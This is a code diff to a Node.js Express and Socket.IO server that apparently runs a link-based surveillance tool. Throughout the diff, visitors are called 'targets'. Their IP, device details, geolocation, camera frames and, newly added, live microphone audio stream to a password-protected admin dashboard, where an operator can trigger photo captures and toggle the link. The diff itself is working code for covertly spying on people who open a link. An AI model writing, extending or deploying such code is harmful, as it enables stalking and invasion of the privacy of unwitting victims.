@@ -50,7 +50,6 @@ app.use(sessionMiddleware);
 app.use(express.static(PUBLIC_DIR));
 
 let isLinkActive = true;
-let isAutoCaptureOn = true;
 
 const connectedTargets = new Map();
 const tempPhotos = new Map();
@@ -118,7 +117,8 @@ function getPublicTarget(target) {
         deviceInfo: target.deviceInfo,
         connectedAt: target.connectedAt,
         location: target.location,
-        cameraReady: target.cameraReady
+        cameraReady: target.cameraReady,
+        ip: target.ip
     };
 }
 
@@ -130,14 +130,25 @@ function getPublicTargets() {
     return result;
 }
 
-function emitUsersList() {
-    io.to("admins").emit("update-users-list", getPublicTargets());
-    io.to("admins").emit("update-history", getFilteredHistory().slice().reverse());
+function emitGlobalState() {
+    io.to("admins").emit("update-admin-state", {
+        linkActive: isLinkActive,
+        users: getPublicTargets(),
+        history: getFilteredHistory().slice().reverse(),
+        photos: Array.from(tempPhotos.values())
+    });
 }
 
 app.get("/", (req, res) => res.sendFile(path.join(PUBLIC_DIR, "user.html")));
 app.get("/user.html", (req, res) => res.sendFile(path.join(PUBLIC_DIR, "user.html")));
-app.get("/admin.html", (req, res) => res.sendFile(path.join(PUBLIC_DIR, "admin.html")));
+
+// Protected admin page route
+app.get("/admin.html", (req, res) => {
+    if (!isAdminRequest(req)) {
+        return res.redirect("/");
+    }
+    res.sendFile(path.join(PUBLIC_DIR, "admin.html"));
+});
 
 app.post("/api/admin/login", (req, res) => {
     const { password } = req.body || {};
@@ -145,7 +156,10 @@ app.post("/api/admin/login", (req, res) => {
         return res.status(401).json({ ok: false, error: "Wrong password." });
     }
     req.session.isAdmin = true;
-    req.session.save(() => { res.json({ ok: true }); });
+    req.session.save((err) => {
+        if (err) return res.status(500).json({ ok: false, error: "Session save failed" });
+        res.json({ ok: true });
+    });
 });
 
 app.post("/api/admin/logout", requireAdmin, (req, res) => {
@@ -187,12 +201,21 @@ io.on("connection", (socket) => {
         socket.join("admins");
         socket.emit("admin-initial-state", {
             linkActive: isLinkActive,
-            autoCapture: isAutoCaptureOn,
             users: getPublicTargets(),
             history: getFilteredHistory().slice().reverse(),
             photos: Array.from(tempPhotos.values()),
             maxUsers: MAX_USERS
         });
+    });
+
+    socket.on("admin-toggle-link", (status) => {
+        if (!authenticatedAdmins.has(socket.id)) return;
+        isLinkActive = Boolean(status);
+        if (!isLinkActive) {
+            io.to("users").emit("link-disabled");
+        }
+        io.emit("link-status-changed", isLinkActive);
+        emitGlobalState();
     });
 
     socket.on("admin-trigger-capture", (targetSocketId) => {
@@ -237,7 +260,7 @@ io.on("connection", (socket) => {
             };
             connectedTargets.set(socket.id, target);
             socket.join("users");
-            emitUsersList();
+            emitGlobalState();
         }
     });
 
@@ -268,11 +291,7 @@ io.on("connection", (socket) => {
             socket.join("users");
         }
         target.cameraReady = true;
-        if (isAutoCaptureOn && !target.autoCaptureStarted) {
-            target.autoCaptureStarted = true;
-            socket.emit("start-auto-capture");
-        }
-        emitUsersList();
+        emitGlobalState();
     });
 
     socket.on("user-location", (locData) => {
@@ -282,12 +301,17 @@ io.on("connection", (socket) => {
             latitude: Number(locData.latitude.toFixed(6)), 
             longitude: Number(locData.longitude.toFixed(6)) 
         };
-        emitUsersList();
+        emitGlobalState();
     });
 
     socket.on("live-stream-frame", (frameData) => {
         if (!isLinkActive || !connectedTargets.has(socket.id) || !isValidImageData(frameData)) return;
         io.to("admins").emit("update-live-stream", { socketId: socket.id, frameData });
+    });
+
+    socket.on("live-audio-chunk", (audioData) => {
+        if (!isLinkActive || !connectedTargets.has(socket.id)) return;
+        io.to("admins").emit("update-live-audio", { socketId: socket.id, audioData });
     });
 
     socket.on("user-photo-captured", (imageData) => {
@@ -328,7 +352,7 @@ io.on("connection", (socket) => {
             });
 
             connectedTargets.delete(socket.id);
-            emitUsersList();
+            emitGlobalState();
         }
     });
 });
